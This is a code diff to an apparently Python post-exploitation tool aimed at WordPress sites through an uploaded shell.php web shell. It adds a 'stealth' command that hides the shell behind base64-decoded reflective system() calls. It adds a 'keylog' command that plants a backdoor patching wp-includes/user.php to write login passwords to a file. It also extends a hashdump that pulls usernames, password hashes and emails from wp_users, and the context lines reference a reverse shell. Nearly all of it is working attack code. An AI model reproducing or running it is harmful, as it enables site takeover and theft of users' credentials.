@@ -76,6 +76,10 @@ def commandloop(host,uploaddir):
             hashdump(host, uploaddir)
         if cmd == "upgrade":
             upgrade(host, uploaddir)
+        if cmd == "stealth":
+            stealth(host, uploaddir)
+        if cmd == "keylog":
+            keylogger(host, uploaddir)
         else:
             print "Sent command: " + cmd
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
@@ -118,6 +122,61 @@ def upgrade(host,uploaddir):
     print "Sending reverse shell to " + ip + " port " + port
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
 
+
+def stealth(host,uploaddir):
+    hide_shell = '''<?php
+$command = $_GET["cmd"];
+$command = substr($command, 0, -1);
+$command = base64_decode($command);
+
+if (class_exists('ReflectionFunction')) {
+   $function = new ReflectionFunction('system');
+   $thingy = $function->invoke($command );
+
+} elseif (function_exists('call_user_func_array')) {
+   call_user_func_array('system', array($command));
+
+} elseif (function_exists('call_user_func')) {
+   call_user_func('system', $command);
+
+} else {
+   system($command);
+}
+
+?>
+'''
+    payload = hide_shell.encode('base64')
+    params = [
+        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > shell.php').encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+
+
+def keylogger(host,uploaddir):
+    evilcode = '''<?php
+$real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
+$evil = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7CiAgICAgJGZpbGUgPSAncGFzc3dvcmRzLnR4dCc7CiAgICAgJGNyZWR6ID0gZGF0ZSgnWS1tLWQnKSAuICIgLSBVc2VybmFtZTogIiAuICRfUE9TVFsnbG9nJ10gLiAiICYmIFBhc3N3b3JkOiAiIC4gJF9QT1NUWydwd2QnXSAuICJcbiI7CiAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjcmVkeiwgRklMRV9BUFBFTkQgfCBMT0NLX0VYKTs";
+$real = base64_decode($real);
+$evil = base64_decode($evil);
+
+//read the entire string
+$orig=file_get_contents('../../../wp-includes/user.php');
+
+//replace something in the file string - this is a VERY simple example
+$orig=str_replace("$real", "$evil",$orig);
+
+//write the entire string
+file_put_contents('../../../wp-includes/user.php', $orig);
+?>'''
+    payload = evilcode.encode('base64')
+
+    params = [
+        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    params = [
+        ('cmd', 'php backdoor.php'.encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    print sendcommand.text
+
 def hashdump(host,uploaddir):
     items = datacreds(host, uploaddir)
     dumpfile = '''<?php
@@ -133,13 +192,13 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
-$sql = "SELECT ID, user_login, user_pass FROM wp_users";
+$sql = "SELECT ID, user_login, user_pass, user_email FROM wp_users";
 $result = $conn->query($sql);
 
 if ($result->num_rows > 0) {
     // output data of each row
     while($row = $result->fetch_assoc()) {
-        echo "ID: " . $row["ID"]. "- Userame: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "\n";
+        echo "ID: " . $row["ID"]. "  - Username: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "  Email: " . $row["user_email"]. "\n";
     }
 } else {
     echo "0 results";
